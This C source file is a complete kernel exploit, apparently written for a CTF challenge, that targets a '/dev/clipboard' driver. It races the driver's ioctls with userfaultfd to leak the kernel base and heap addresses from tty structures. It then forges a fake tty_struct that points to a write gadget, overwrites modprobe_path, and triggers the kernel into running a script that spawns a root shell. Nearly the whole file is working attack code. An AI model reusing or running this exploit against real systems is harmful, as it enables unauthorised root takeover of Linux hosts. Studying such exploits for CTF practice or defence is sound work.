#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>

// commands
#define DEV_PATH "/dev/clipboard"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

#define MSG_COPY        040000

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}


static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
   ; system("echo '#!/bin/sh' > /home/tsj/hax; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /home/tsj/hax");
    system("chmod +x /home/tsj/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/tsj/root");
    system("chmod +x /home/tsj/root");
    system("/home/tsj/root");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    puts("test");
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

#define CMD_READ 0x4000
#define CMD_WRITE 0x4001
#define MAX_DATA_LEN 0x400

typedef struct {
    pid_t pid;
    unsigned short length;
    char data[MAX_DATA_LEN];
} query_t;

typedef struct {
    int magic;
    int kref;
    uint64_t* dev;
    uint64_t* driver;
    uint64_t* ops;
} fake_tty_t;

static unsigned page_size;

char leak_buf[0x4000];
void* addr;
uint64_t tty_leak;
uint8_t tty_buf[0x1000];
uint64_t gadget;

static int fault_cnt = 0;
static void* handler(void *arg)
{
    puts("Handler thread started");
    struct uffd_msg msg;
    int uffd = (int) arg;
    char* page = NULL;
    struct uffdio_copy uffdio_copy;

    page = mmap(NULL, page_size*2, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (page == MAP_FAILED) {
        errExit("mmap");
    }

    uint64_t* p_page = (uint64_t*)page;

    for (;;) {
        int ret;
        struct pollfd pollfd;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;

        ret = poll(&pollfd, 1, -1);

        if (ret < 0) {
            errExit("poll");
        }

        printf("poll() returns: nready = %d; "
                "POLLIN = %d; POLLERR = %d\n", ret,
                (pollfd.revents & POLLIN) != 0,
                (pollfd.revents & POLLERR) != 0);

        ret = read(uffd, &msg, sizeof(msg));

        if (ret == 0) {
            printf("EOF on userfaultfd \n");
            exit(EXIT_FAILURE);
        }

        if (ret < 0) {
            errExit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            printf("Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        printf("UFFD_EVENT_PAGEFAULT event: ");
        printf("flags = %p; ", msg.arg.pagefault.flags);
        printf("address = %p \n", msg.arg.pagefault.address);

        if (fault_cnt == 0) {
            *(uint16_t*)page = MAX_DATA_LEN;

            uffdio_copy.src = (uint64_t) page;
            uffdio_copy.dst = (uint64_t) msg.arg.pagefault.address & ~(page_size -1);
            uffdio_copy.len = page_size;
        }
        else if (fault_cnt == 1) {
            query_t* q = (query_t*)(page + page_size - 0x4);
            q->pid = getpid();
            *(uint16_t*)0xdead1000 = 0x2000;

            uffdio_copy.src = page;
            uffdio_copy.dst = (uint64_t) msg.arg.pagefault.address & ~(page_size -1);
            uffdio_copy.len = page_size;
        }
        else if (fault_cnt == 4) {
            *(uint32_t*)page = MAX_DATA_LEN;
            uffdio_copy.src = (uint64_t) page;
            uffdio_copy.dst = (uint64_t) msg.arg.pagefault.address & ~(page_size -1);
            uffdio_copy.len = page_size;
        }
        else if (fault_cnt == 5) {
            query_t* q = (query_t*)(page + 5 * page_size - 0x4);
            q->pid = getpid();
            *(uint16_t*)0xdead5000 = 0x2000;

            uffdio_copy.src = page;
            uffdio_copy.dst = (uint64_t) msg.arg.pagefault.address & ~(page_size -1);
            uffdio_copy.len = page_size;
        }
        else if (fault_cnt == 6) {
            memcpy(page +0x2, tty_buf, page_size);
            uint64_t* p_page = (uint64_t*)(page + 0x2);
            fake_tty_t* tty = (fake_tty_t*)(page+0x2);
            tty->magic = 0x00005401;
            tty->kref = 1;
            tty->dev = tty_leak + (0x8 * 0x64);
            tty->driver = tty_leak + (0x8 * 0x64);
            tty->ops = tty_leak + (0x8 * 0x64);
            //p_page[0x64 +12] = 0x414243444545;
            p_page[0x64 +12] = gadget;

            uffdio_copy.src = page;
            uffdio_copy.dst = (uint64_t) msg.arg.pagefault.address & ~(page_size -1);
            uffdio_copy.len = page_size;
        }
        else {
            uffdio_copy.src = page;
            uffdio_copy.dst = (uint64_t) msg.arg.pagefault.address & ~(page_size -1);
            uffdio_copy.len = page_size;
        }

        printf("fault cnt: %d \n", fault_cnt);

        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;

        ret = ioctl(uffd, UFFDIO_COPY, &uffdio_copy);

        if (ret < 0) {
            errExit("UFFDIO_COPY");
        }
        
        printf("Number of bytes copied: %lld \n", uffdio_copy.copy);

        fault_cnt++;
    }

}

static void read_clip(int fd, uint16_t len)
{
    query_t q = {0};
    q.pid = getpid();
    q.length = len;

    if (ioctl(fd, CMD_READ, &q) < 0) {
        q.length = 0x2000;
        errExit("read_clip");
    }

    print_hex8(q.data, len);
}

static void read_clip_fault(int fd, void* fault_addr)
{
    if (ioctl(fd, CMD_READ, fault_addr) < 0) {
        errExit("read_clip");
    }
}

static void write_clip(int fd, char* data, uint16_t len)
{
    query_t q = {0};
    q.length = len;
    q.pid = getpid();

    memcpy(q.data, data, len);

    if (ioctl(fd, CMD_WRITE, &q) < 0) {
        errExit("write_clip");
    }
}

static void write_clip_fault(int fd, void* fault_addr)
{
    if (ioctl(fd, CMD_WRITE, fault_addr) < 0) {
        errExit("write_clip");
    }
}

int main(void) 
{
    int ret;
    int fds[0x10];

    for (int i = 0; i < 0x8; i++) {
        fds[i] = open("/dev/ptmx", O_RDONLY);
    }

    int fd = open(DEV_PATH, O_RDONLY);
    printf("FD: %d \n", fd);
    int uffd = userfaultfd(O_CLOEXEC | O_NONBLOCK);
    pthread_t tid;

    if (fd < 0 || uffd < 0) {
        errExit("open");
    }

    for (int i = 8; i < 0x10; i++) {
        fds[i] = open("/dev/ptmx", O_RDONLY);
    }

    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;

    ret = ioctl(uffd, UFFDIO_API, &uffdio_api);

    if (ret < 0) {
        errExit("uffdio api");
    }

    page_size = sysconf(_SC_PAGE_SIZE);

    size_t len = page_size * 10;

    uint64_t fault_addr = FAULT_ADDR;

    addr = mmap(fault_addr, len, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    printf("Mmaped address: %p \n", addr);
    if (addr == MAP_FAILED) {
        errExit("mmap");
    }

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    ret = ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

    if (ret < 0) {
        errExit("uffdio register");
    }

    ret = pthread_create(&tid, NULL, handler, (void*)uffd);
    if (ret != 0) {
        errno = ret;
        errExit("pthread_create");
    }

    read_clip_fault(fd, (void*)(fault_addr + page_size - 4));

    uint64_t* p_addr = (uint64_t*)(addr+0x2);
    uint64_t k_base = p_addr[643] - 0x10a9be0;
    uint64_t heap_leak = p_addr[647] + 0xc00;
    gadget = k_base + 0x20a01c;
    uint64_t modprobe = k_base + 0x1666880;

    tty_leak = heap_leak - 56;

    memcpy(tty_buf, addr + page_size*2 + 0x2, page_size);

    //print_hex8(tty_buf, sizeof(tty_buf));
    
    printf("heap_leak: %p \n", heap_leak);
    printf("tty leak: %p \n", tty_leak);
    printf("kernel base: %p \n", k_base);
    printf("gadget: %p \n", gadget);
    printf("modprobe: %p \n", modprobe);

    printf("\n **** Stage 2 **** \n");

    write_clip_fault(fd, (void*)(fault_addr + 5 * page_size - 4));

    for (int i = 0; i < 0x10; i++) {
        ioctl(fds[i], 0x6d6f682f, modprobe);
        ioctl(fds[i], 0x73742f65, modprobe + 0x4);
        ioctl(fds[i], 0x61682f6a, modprobe + 0x8);
        ioctl(fds[i], 0x0078, modprobe + 0xc);
    }


    // 0xffffffff8120a01c : xor eax, eax ; mov dword ptr [rdx], esi ; ret
    // 0xffffffff8109d880 : add al, 0x48 ; mov dword ptr [rsi], edx ; ret


    // need gadget: 
    // rdi - rsi - rdx - rcx - r8 - r9 - rest on stack
    // mov ptr [rdx], rsi
    //


    puts("Triggering shell");
    shell_modprobe();

    WAIT();

    return 0;
}

/*

    ioctl(tty_fds[0], 0x6d6f682f, modeprobe_path);
    ioctl(tty_fds[0], 0x73752f65, modeprobe_path + 4);
    ioctl(tty_fds[0], 0x682f7265, modeprobe_path + 8);
    ioctl(tty_fds[0], 0x007861, modeprobe_path + 12);
*/
